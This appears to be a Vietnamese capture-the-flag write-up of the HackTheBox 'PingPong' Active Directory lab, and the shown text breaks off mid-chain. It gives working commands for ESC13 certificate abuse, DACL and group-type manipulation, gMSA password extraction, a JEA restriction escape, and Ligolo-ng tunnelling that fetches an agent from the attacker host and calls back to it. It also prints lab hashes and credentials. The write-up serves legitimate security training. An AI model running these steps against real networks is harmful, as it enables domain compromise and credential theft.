---
layout: post
title: HTB - PingPong
difficulty: Insane
date: 2026-11-12
categories: [write-up, hackthebox]
tags: [kerberos, cross-forest, gmsa, adcs, pivoting, tunneling, jea, rbcd, s4u, local_privesc]
attack_path:
  - node: PING\c.roberts
    type: user
    edge: ESC13 + writeDACL
  - node: PONG\gMSA Managers
    type: group
    edge: ReadGMSAPassword
  - node: Pong_gMSA$
    type: computer
    edge: JEA Escape
  - node: PONG\c.carlssen
    type: user
    edge: WriteProperties
  - node: PONG\svc_sql
    type: user
    edge: RBCD
  - node: PONG\c.adam@mssqlsvc_DC2
    type: user
    edge: SeImpersonatePrivilege
  - node: PONG.HTB
    type: domain
    edge: Reset Password
  - node: PING\r.martinelli
    type: user
    edge: genericAll
  - node: SmartcardAuthentication
    type: template
    edge: ESC4
  - node: PING.HTB
    type: domain
---

> PingPong là một box Windows/AD assumed breach: ta bắt đầu với một bộ credential thấp quyền có sẵn.
> Box có 2 domain và ta phải nhảy qua nhảy lại chúng đúng như cái tên PingPong.
> Box thuần AD rất dài nên đánh rất đã:)

## 1. Enumeration #1

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-31 18:02:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ping.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc1.ping.htb, DNS:ping.htb, DNS:PING
| Not valid before: 2026-04-20T18:54:50
|_Not valid after:  2106-04-20T18:54:50
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h04m32s
| smb2-time:
|   date: 2026-05-31T18:03:14
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Mở bát Nmap là DC của `PING.HTB`, không ngoài dự đoán NTLM bị tắt ở độ khó này (`STATUS_NOT_SUPPORTED`):

```bash
~/HTB/Windows/PingPong $ nxc ldap DC1 -u c.roberts -p AssumedBreach123 -M whoami
LDAP        10.129.245.56   389    DC1              [*] None (name:DC1) (domain:ping.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.245.56   389    DC1              [-] ping.htb\c.roberts:AssumedBreach123 STATUS_NOT_SUPPORTED
```

Vậy thì ta xin vé vàng dùng thôi:

```bash
~/HTB/Windows/PingPong $ sudo ntpdate -s DC1
~/HTB/Windows/PingPong $ getTGT.py ping.htb/c.roberts:AssumedBreach123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.roberts.ccache
```

Kiểm tra sơ qua thông tin `c.roberts`, cậu này nằm ở phòng IT.. IT? Breach to vậy à:)

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=c.roberts.ccache
~/HTB/Windows/PingPong $ nxc ldap DC1 -k --use-kcache -M whoami
LDAP        DC1             389    DC1              [*] None (name:DC1) (domain:PING.HTB) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1             389    DC1              [+] PING.HTB\c.roberts from ccache
WHOAMI      DC1             389    DC1              Name: C.Roberts
WHOAMI      DC1             389    DC1              Description: Junior IT Technician
WHOAMI      DC1             389    DC1              sAMAccountName: C.Roberts
WHOAMI      DC1             389    DC1              Enabled: Yes
WHOAMI      DC1             389    DC1              Password Never Expires: Yes
WHOAMI      DC1             389    DC1              Last logon: 2026-05-31 18:06:49 UTC
WHOAMI      DC1             389    DC1              Password Last Set: 2025-12-28 08:14:52 UTC
WHOAMI      DC1             389    DC1              Bad Password Count: 0
WHOAMI      DC1             389    DC1              Distinguished Name: CN=C.Roberts,CN=Users,DC=ping,DC=htb
WHOAMI      DC1             389    DC1              Member of: CN=IT,CN=Users,DC=ping,DC=htb
WHOAMI      DC1             389    DC1              User SID: S-1-5-21-750635624-2058721901-1932338391-2617
```

`PONG.HTB` nằm ở mạng nội bộ, có mối quan hệ Bidirectional, nghĩa là user của 2 rừng đều có thể xác thực tới 2 DC.

```bash
~/HTB/Windows/PingPong $ nxc ldap DC1 -k --use-kcache --dc-list
LDAP        DC1             389    DC1              [*] None (name:DC1) (domain:PING.HTB) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1             389    DC1              [+] PING.HTB\c.roberts from ccache
LDAP        DC1             389    DC1              dc1.ping.htb = 192.168.2.1
LDAP        DC1             389    DC1              [+] Found DC in trusted domain: dc2.pong.htb
LDAP        DC1             389    DC1              pong.htb -> Bidirectional -> Forest Transitive
LDAP        DC1             389    DC1              dc2.pong.htb = 192.168.2.2
```

Ngoài ra có một tài khoản gMSA không rõ ai có quyền đọc:

```bash
~/HTB/Windows/PingPong $ nxc ldap DC1 -k --use-kcache --computers
LDAP        DC1             389    DC1              [*] None (name:DC1) (domain:PING.HTB) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        DC1             389    DC1              [+] PING.HTB\c.roberts from ccache
LDAP        DC1             389    DC1              [*] Total records returned: 2
LDAP        DC1             389    DC1              DC1$
LDAP        DC1             389    DC1              gMSA$
```

## 2. ESC13

Box to như này chẳng lẽ không có ADCS, dùng Certipy đào thử nào:

```bash
~/HTB/Windows/PingPong $ certipy find -k -target DC1.ping.htb -vulnerable -stdout
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: DC1.ping.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 1 OID linked to a template
[!] DNS resolution failed: The DNS query name does not exist: dc1.ping.htb.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'ping-DC1-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'ping-DC1-CA'
[*] Checking web enrollment for CA 'ping-DC1-CA' @ 'dc1.ping.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : ping-DC1-CA
    DNS Name                            : dc1.ping.htb
    Certificate Subject                 : CN=ping-DC1-CA, DC=ping, DC=htb
    Certificate Serial Number           : 6F8E726EEFA64B894CE82D498BC27632
    Certificate Validity Start          : 2026-04-20 18:54:41+00:00
    Certificate Validity End            : 2126-04-20 19:04:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : PING.HTB\Administrators
      Access Rights
        ManageCa                        : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        ManageCertificates              : PING.HTB\Administrators
                                          PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Enroll                          : PING.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : TemporaryWinRM
    Display Name                        : Temporary WinRM
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-12-23T17:19:28+00:00
    Template Last Modified              : 2025-12-27T21:12:15+00:00
    Issuance Policies                   : 1.3.6.1.4.1.311.21.8.5808481.4086498.12600997.2067446.8927163.214.489503.1996623
    Linked Groups                       : CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Domain Users
                                          PING.HTB\Enterprise Admins
    [+] User Enrollable Principals      : PING.HTB\Domain Users
    [!] Vulnerabilities
      ESC13                             : Template allows client authentication and issuance policy is linked to group 'CN=TempWinRMAccess,CN=Users,DC=ping,DC=htb'.
```

Bắt được ngay ESC13 dưới cái template `TempWinRMAccess`, tên này chắc chắn liên quan WinRM rồi.
Lỗ hổng này cho phép kẻ tấn công lợi dụng tính năng Issuance Policies lúc xin cert để liên kết với một Universal Security Group được cắm trên template đó.

Xin cert luôn và thử WinRM thôi:

```bash
~/HTB/Windows/PingPong $ certipy req -k -target DC1.ping.htb -ca ping-DC1-CA -template TemporaryWinRM
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[!] DNS resolution failed: The DNS query name does not exist: DC1.ping.htb.
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The DNS query name does not exist: PING.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 17
[*] Successfully requested certificate
[*] Got certificate with UPN 'C.Roberts@ping.htb'
[*] Certificate object SID is 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Saving certificate and private key to 'c.roberts.pfx'
[*] Wrote certificate and private key to 'c.roberts.pfx'
~/HTB/Windows/PingPong $ certipy auth -pfx c.roberts.pfx -dc-ip 10.129.245.56 -domain ping.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'C.Roberts@ping.htb'
[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
[*] Using principal: 'c.roberts@ping.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'c.roberts.ccache'
File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'c.roberts.ccache'
[*] Trying to retrieve NT hash for 'c.roberts'
[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
```

Có shell rồi, nhưng chưa có user flag:<

```bash
~/HTB/Windows/PingPong $ winrmexec.py DC1 -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] '-target_ip' not specified, using DC1
[*] '-port' not specified, using 5985
[*] '-url' not specified, using http://DC1:5985/wsman
[*] using domain and username from ccache: PING.HTB\c.roberts
[*] '-spn' not specified, using HTTP/DC1@PING.HTB
[*] '-dc-ip' not specified, using PING.HTB
[*] requesting TGS for HTTP/DC1@PING.HTB
PS C:\Users\C.Roberts\Documents>
```

## 3. Pivoting & Tunneling

Giờ mình sẽ dùng Ligolo-ng để mở đường tới DC2.

> Tôi yêu Ligolo-ng <3

Tải agent lên DC1:

```powershell
PS C:\Users\C.Roberts\Documents> iwr http://10.10.14.67/agent.exe -outf agent.exe
```

Bật proxy ở máy tấn công:

```bash
~/Ligolo-ng $ sudo ligolo-ng-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng »
```

Kết nối chúng với nhau:

```powershell
PS C:\Users\C.Roberts\Documents> .\agent.exe -connect 10.10.14.67:11601 -ignore-cert
time="2026-05-31T12:15:52-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-05-31T12:15:53-07:00" level=info msg="Connection established" addr="10.10.14.67:11601"
```

Mở đường xe chạy:

```bash
ligolo-ng » INFO[0029] Agent joined.                                 id=00155d168601 name="PING\\C.Roberts@dc1" remote="10.129.245.56:59244"
ligolo-ng » session
? Specify a session : 1 - PING\C.Roberts@dc1 - 10.129.245.56:59244 - 00155d168601
[Agent : PING\C.Roberts@dc1] » start
INFO[0039] Starting tunnel to PING\C.Roberts@dc1 (00155d168601)
```

Vẽ đường xe bay:

```bash
~/HTB/Windows/PingPong $ sudo ip route add 192.168.2.0/24 dev ligolo
```

> Bạn có thể dùng lệnh autoroute của Ligolo-ng đỡ cần phải nhớ cái lệnh route này.

## 4. Enumeration #2

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-31 19:23:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pong.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-31T18:01:30
|_Not valid after:  2056-05-31T18:01:30
|_ssl-date: 2026-05-31T19:24:53+00:00; +1m06s from scanner time.
| ms-sql-info:
|   192.168.2.2:1433:
|     Version:
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pong.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC2; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DC2, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:16:86:02 (Microsoft)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-05-31T19:24:10
|_  start_date: N/A
|_clock-skew: mean: 1m04s, deviation: 2s, median: 1m02s
```

Nmap DC2 thấy một sự khác biệt so với DC1 là cổng 1433 mở, cái điểm này làm tôi nhớ box DarkZero ghê - Lại dùng MSSQL để compromise DC2 chăng.

Bên này cũng có tài khoản gMSA:

```bash
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache --computers
LDAP        DC2             389    DC2              [*] None (name:DC2) (domain:PING.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC2             389    DC2              [+] PING.HTB\c.roberts from ccache
LDAP        DC2             389    DC2              [*] Total records returned: 2
LDAP        DC2             389    DC2              DC2$
LDAP        DC2             389    DC2              Pong_gMSA$
```

## 5. Chiếm lấy Pong_gMSA$

BloodyAD cho biết cậu này có quyền writeDACL lên nhóm `gMSA Managers`, nhưng mà gượm đã, ta chưa thể lạm dụng nó luôn được.
Nhóm này nằm ở rừng bên, muốn gia nhập phải đổi loại của nó sang DomainLocal.

Mình đã tạo một cái bảng để tra cứu mã Hex và Dec của chúng dùng cho nhanh:

| Group Type | Scope | Hex | Decimal (Signed) |
| :--- | :--- | :--- | :--- |
| **Distribution Group** | Global | `0x00000002` | `2` |
| | Domain Local | `0x00000004` | `4` |
| | Universal | `0x00000008` | `8` |
| **Security Group** | Global | `0x80000002` | `-2147483646` |
| | Domain Local | `0x80000004` | `-2147483644` |
| | Universal | `0x80000008` | `-2147483640` |
| **Builtin / System Group** | Builtin Local | `0x80000005` | `-2147483643` |

> Distribution là nhóm không mang ACL, đa số tạo ra để gửi mail cho đỡ tốn giấy Kerberos.
> Security là mục tiêu chính của chúng ta, các nhóm có quyền.
> Builtin là nhóm nội bộ nằm trong một máy Windows thôi.

Trước hết vẫn phải thêm genericAll lên nó:

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d ping.htb -H DC2.pong.htb add genericAll "gmsa managers" S-1-5-21-750635624-2058721901-1932338391-2617
[+] S-1-5-21-750635624-2058721901-1932338391-2617 has now GenericAll on gmsa managers
```

Sửa groupType với giá trị truyền vào phải là DEC rồi thêm mình vào nhóm:

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d ping.htb -H DC2.pong.htb set object "gmsa managers" groupType -v -2147483644
[+] gmsa managers's groupType has been updated
~/HTB/Windows/PingPong $ bloodyad -k -d ping.htb -H DC2.pong.htb add groupMember "gmsa managers" S-1-5-21-750635624-2058721901-1932338391-2617
[+] S-1-5-21-750635624-2058721901-1932338391-2617 added to gmsa managers
```

Cứ tưởng thế là ngon ăn, chạy NetExec chỉ nhận được hash NTLM của nó, mà NTLM thì bị tắt rồi. Phải làm sao đây?
Đừng lo lắng mật khẩu được mã hóa base64 lưu thẳng trong thuộc tính `msDS-ManagedPassword` của nó rồi, đọc bằng BloodyAD thôi.

```bash
~/HTB/Windows/PingPong $ bloodyad -k -d ping.htb -H DC2.pong.htb get object pong_gmsa$ --attr msDS-ManagedPassword --raw

distinguishedName: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb
msDS-ManagedPassword: AQAAACQCAAAQABIBFAIcAnZcmZ4KqFCtPpSjvqoU+EgpUoPrn75NNcxcEUsUg8eNrsYWt8U2pxUticTZuSbd7siJN6AK2Mp+b15KPEmkjiqH9zFjYAhOui8IMNZu8Pl1aaQgkJfFJ/L224wqD3/Kog81sN1bwLuCIB3tHU6tcRmTohbQOMIZx0RqKUcEg7qd6/4XMF/1kFC2Bc3+7e0VfcseGeanvUHndNj5T/H75yHq4v5knml+dF4QYvh3dwE2XTOdJcKLpYOZv8g18VKeSRzft5OXACaIX5wf8hPh0VBQqZUZSDnLY4Rwlzgh14Us2t4oahamE0oqhw7NCHnWXtH2N/EMPeJ34zALIwoPkxMAAHhZG1ix0PWawJDVD5CKMgZ7hrJ18mTjzuXjTllpQl7lvoHB3PI4906UtbXebmbtqtz6CQYy+vA3Icyxew0XHmxD6aptkooAqyYsLTvwvkTH4FbaYWV/AU5nJG7FBtnQ24ki1uoI9YzDfGfaDJqXG0rgLIZebmVNogiDgXaN64p2l9vI8AkyoZGhCzvlfgi5qDn0Sdm2Iy/FdUMybLIdP0bomkPm0SzGrMvHC2duJmYX9/+GpCskUp9/V9xPkU+wxHO8R68QVXr0xk7CHg/9zn8zF7OWVt33NCIrrf3eIXh44ZCH2YbJg0GmZhquATIvqxuB2PuoAZDcrx5N60WvaM0AAFAhoQ1cCwAAUMPQWlsLAAA=
```

> Nhớ thêm cờ `--raw` để BloodyAD trả về giá trị thô, sạch sẽ.

Việc còn lại để Rubeus lo nếu bạn không muốn mã hóa tay.

Giải mã và lưu vào biến trong Powershell, vì mật khẩu của gMSA không thể nào đọc được đâu:

```powershell
PS C:\Users\Luverie> $blob = [System.Convert]::FromBase64String("AQAAACQCAAAQABIBFAIcAnZcmZ4KqFCtPpSjvqoU+EgpUoPrn75NNcxcEUsUg8eNrsYWt8U2pxUticTZuSbd7siJN6AK2Mp+b15KPEmkjiqH9zFjYAhOui8IMNZu8Pl1aaQgkJfFJ/L224wqD3/Kog81sN1bwLuCIB3tHU6tcRmTohbQOMIZx0RqKUcEg7qd6/4XMF/1kFC2Bc3+7e0VfcseGeanvUHndNj5T/H75yHq4v5knml+dF4QYvh3dwE2XTOdJcKLpYOZv8g18VKeSRzft5OXACaIX5wf8hPh0VBQqZUZSDnLY4Rwlzgh14Us2t4oahamE0oqhw7NCHnWXtH2N/EMPeJ34zALIwoPkxMAAHhZG1ix0PWawJDVD5CKMgZ7hrJ18mTjzuXjTllpQl7lvoHB3PI4906UtbXebmbtqtz6CQYy+vA3Icyxew0XHmxD6aptkooAqyYsLTvwvkTH4FbaYWV/AU5nJG7FBtnQ24ki1uoI9YzDfGfaDJqXG0rgLIZebmVNogiDgXaN64p2l9vI8AkyoZGhCzvlfgi5qDn0Sdm2Iy/FdUMybLIdP0bomkPm0SzGrMvHC2duJmYX9/+GpCskUp9/V9xPkU+wxHO8R68QVXr0xk7CHg/9zn8zF7OWVt33NCIrrf3eIXh44ZCH2YbJg0GmZhquATIvqxuB2PuoAZDcrx5N60WvaM0AAFAhoQ1cCwAAUMPQWlsLAAA=")
PS C:\Users\Luverie> $p = (ConvertFrom-ManagedPasswordBlob -Blob $blob).CurrentPassword
```

Tính toán hash AES256:

```powershell
PS C:\Users\Luverie> .\Tools\Rubeus.exe hash /user:pong_gmsa$ /password:$p /domain:pong.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Calculate Password Hash(es)

[*] Input password             : 屶麙ꠊ교鐾뺣ᒪ䣸利뺟㕍峌䬑茔跇욮뜖㛅ᖧ褭�⚹览ꀷ�绊幯㱊ꑉ⪎挱ࡠ멎࠯혰痹ꑩ造얗�⪌缏ꋊ㔏�쁛芻ᴠᷭ굎ᥱꊓ퀖숸윙橄䜩茄鶺ﻫ〗傐ֶﻍ紕ị붧�俹ﯱ⇧擾榞瑾ၞ睷㘁㍝▝诂莥뾙㗈勱䦞�鎷蠦鱟僑ꥐᦕ㥈揋炄㢗휡ⲅ�樨ꘖ䨓蜪촎礈廖㴌矢ャ⌋༊᎓
[*] Input username             : pong_gmsa$
[*] Input domain               : pong.htb
[*] Salt                       : PONG.HTBhostpong_gmsa.pong.htb
[*]       rc4_hmac             : C39218097EF43DCCEEC91879DEB216E7
[*]       aes128_cts_hmac_sha1 : 632AFDEA39D2ABF25FA6436F8ADE2102
[*]       aes256_cts_hmac_sha1 : 6BA7F8E28096481F4F88A7A13BE300DA1FBC6220D64BCC9E3E2B9B0F6203021F
```

Xin vé thành công rồi:


```bash
~/HTB/Windows/PingPong $ getTGT.py pong.htb/pong_gmsa$ -aesKey 6BA7F8E28096481F4F88A7A13BE300DA1FBC6220D64BCC9E3E2B9B0F6203021F
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in pong_gmsa$.ccache
```

## 6. JEA Endpoint

Description của nó khá rõ ràng:

```bash
~/HTB/Windows/PingPong $ export KRB5CCNAME=pong_gmsa\$.ccache  
~/HTB/Windows/PingPong $ nxc ldap DC2 -k --use-kcache -M whoami
LDAP        DC2             389    DC2              [*] None (name:DC2) (domain:PONG.HTB) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        DC2             389    DC2              [+] PONG.HTB\pong_gmsa$ from ccache
WHOAMI      DC2             389    DC2              Name: Pong_gMSA
WHOAMI      DC2             389    DC2              Description: JEA Enabled gMSA on DC1
WHOAMI      DC2             389    DC2              sAMAccountName: Pong_gMSA$
WHOAMI      DC2             389    DC2              Enabled: Yes
WHOAMI      DC2             389    DC2              Password Never Expires: No
WHOAMI      DC2             389    DC2              Last logon: 2026-05-31 23:20:16 UTC
WHOAMI      DC2             389    DC2              Password Last Set: 2026-05-31 20:54:58 UTC
WHOAMI      DC2             389    DC2              Bad Password Count: 0
WHOAMI      DC2             389    DC2              Distinguished Name: CN=Pong_gMSA,CN=Managed Service Accounts,DC=pong,DC=htb
WHOAMI      DC2             389    DC2              User SID: S-1-5-21-2410575906-3092493790-2123333151-1123
```

Lục soát lại máy DC1 từ phiên của `c.roberts` thì tìm thấy file cấu hình JEA thật:

```powershell
PS C:\Users\C.Roberts\Documents> ls C:\ProgramData


    Directory: C:\ProgramData


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/17/2026   3:41 AM                JEA
d---s-         6/15/2025   9:55 PM                Microsoft
d-----         6/16/2025   4:05 AM                Package Cache
d-----        11/28/2025   6:53 AM                Packages
d-----          1/1/2026   9:29 AM                regid.1991-06.com.microsoft
d-----          5/8/2021   1:20 AM                SoftwareDistribution
d-----        12/25/2025   6:01 AM                ssh
d-----         6/16/2025   4:08 AM                USOPrivate
d-----          5/8/2021   1:20 AM                USOShared
d-----         6/16/2025   4:05 AM                VMware


PS C:\Users\C.Roberts\Documents> ls C:\ProgramData\JEA


    Directory: C:\ProgramData\JEA


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2/5/2026   5:39 AM            477 JEA.pssc
```

Nó có tên là `restricted`, không hiểu sao dòng đó bị comment để ý kỹ mới thấy.

```powershell
PS C:\Users\C.Roberts\Documents> cat C:\ProgramData\JEA\JEA.pssc
@{

# Version number of the schema used for this document
SchemaVersion = '2.0.0.0'

# ID used to uniquely identify this document
GUID = 'e26939b6-819a-496e-be9a-dfb45427c765'

# ConfigurationName = 'restricted'

# Author of this document
Author = 'Administrator'

# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'
SessionType = 'RestrictedRemoteServer'
LanguageMode = 'ConstrainedLanguage'
}
```

Khổ cái là tôi tìm cách dùng evil-winrm và winrmexec.py đăng nhập vào JEA mãi không được, cũng chả tìm thấy tool nào khác hỗ trợ nên đành phải gõ script riêng cho cái việc này. Tốn quá nhiều thời gian!

```python
import readline
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan("DC1.ping.htb", auth = "kerberos", ssl = False, negotiate_service = "WSMAN")

with wsman, RunspacePool(wsman, configuration_name = "restricted") as pool:
	while True:
		try:
			cmd = input("JEA> ")
			if cmd.lower() in ["exit", "quit"]: break
			if not cmd.strip(): continue
			
			with PowerShell(pool) as ps:
				ps.add_script(cmd)
				output = ps.invoke()
				for item in output: print(item)
				if ps.had_errors:
					for e in ps.streams.error: print(f"Error: {e}")
		
		except Exception as e: print(f"Error: {e}")
```

## 7. Vượt qua Giới hạn & User flag

Liệt kê những lệnh mình có thể dùng thì toàn lệnh vô hại, tôi đã xem và thử các kỹ thuật escape khác nhau nhưng đều thất bại.

```bash
~/HTB/Windows/PingPong $ python3 jea.py
JEA> Get-Command
Clear-Host
Exit-PSSession
Get-Command
Get-FormatData
Get-Help
Measure-Object
Out-Default
Select-Object
```

Nhìn lại file `JEA.pssc` kia, cái LanguageMode chưa phải là `NoLanguage`, và đặc biệt nó cũng chẳng chặn cái Provider nào.
Vậy thì thử cú pháp của FileSystem Provider xem:

```powershell
JEA> ${C:\Windows\win.ini}
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

Quào, nó hoạt động kìa.

> PowerShell dùng Provider để cho phép ta duyệt và thao tác với nhiều loại dữ liệu khác nhau y hệt như đang thao tác với các ổ đĩa trên máy tính.
> Các provider mặc định gồm:
> * FileSystem Provider: Giúp đọc/ghi các file và thư mục thật trên ổ cứng.
> * Registry Provider: Giúp duyệt và chỉnh sửa Registry của Windows hệt như đang mở thư mục.
> * Environment Provider: Giúp xem và sửa các biến môi trường như một ổ đĩa.
> * Certificate Provider: Giúp quản lý các chứng chỉ bảo mật.

Điều cần làm ngay bây giờ là đọc thử lịch sử PS của `Pong_gMSA$`, lộ ngay cậu `c.carlssen`:

```powershell
JEA> ${C:\Users\pong_gmsa$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt}
<SNIP>
Get-adgroup "remote management users" -server pong.htb
$c = New-object System.management.automation.pscredential("pong\c.carlssen,$(convertto-securestring -asplaintext -force "A()DUJ!@414"))
